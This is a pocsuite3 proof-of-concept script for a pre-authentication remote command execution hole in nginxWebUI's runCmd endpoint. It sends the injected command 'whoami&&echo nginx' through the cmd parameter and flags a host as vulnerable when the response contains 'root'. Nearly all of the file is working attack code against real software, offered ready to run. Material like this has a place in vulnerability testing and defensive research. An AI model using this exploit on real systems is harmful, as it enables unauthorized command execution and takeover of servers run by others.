# -*- coding: utf-8 -*-
# 2024/1/14

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OrderedDict, OptString


class nginxwebui_runcmd_RCE(POCBase):
    author = '炼金术师诸葛亮'
    createDate = '2024-1-14'
    name = 'nginxWebUI-runCmd-RCE'
    desc = 'nginxWebUI runCmd-前台RCE漏洞'  # 漏洞简要描述

    def _verify(self):
        result = {}
        path = "/AdminPage/conf/runCmd?cmd=whoami%26%26echo%20nginx"
        url = self.url + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            'Cookie': 'SOLONID=ab4603d571394000a48398f2383fdc26; Hm_lvt_8acef669ea66f479854ecd328d1f348f=1705042515; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1705042611',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Upgrade-Insecure-Requests': '1'
        }
        r = requests.get(url,headers=headers)
        try:

            if r.status_code == 200 and 'root' in r.text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass



register_poc(nginxwebui_runcmd_RCE)